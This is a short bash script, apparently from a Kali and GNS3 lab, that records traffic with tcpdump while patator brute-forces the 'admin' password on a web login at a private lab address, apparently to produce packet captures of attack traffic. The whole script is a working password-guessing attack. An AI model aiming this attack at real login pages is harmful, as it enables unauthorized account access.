#!/bin/bash

TARGET="http://192.168.10.3/login"
INTERFACE="eth0"
BRUTE_FOLDER="/home/kali/GNS3/BruteForce"
WORDLIST=$(find "$BRUTE_FOLDER" -type f -name "*.txt" | shuf -n 1)
USERNAME="admin"
PCAP_FILE="/home/kali/GNS3/pcap/bruteforce_web_$(date +%Y%m%d_%H%M%S).pcap"

if [[ ! -f "$WORDLIST" ]]; then
  echo "Password list not found: $WORDLIST"
  exit 1
fi

echo "Starting tcpdump capture to $PCAP_FILE..."
sudo tcpdump -i "$INTERFACE" host 192.168.10.3 -w "$PCAP_FILE" &
TCPDUMP_PID=$!

patator http_fuzz \
  url="$TARGET" \
  method=POST \
  body="username=${USERNAME}&password=FILE0" \
  0="$WORDLIST" \
  -x ignore:code=404 \
  -t 10

echo "Stopping tcpdump..."
kill "$TCPDUMP_PID"

echo "Brute-force simulation complete."
echo "Capture saved to: $PCAP_FILE"
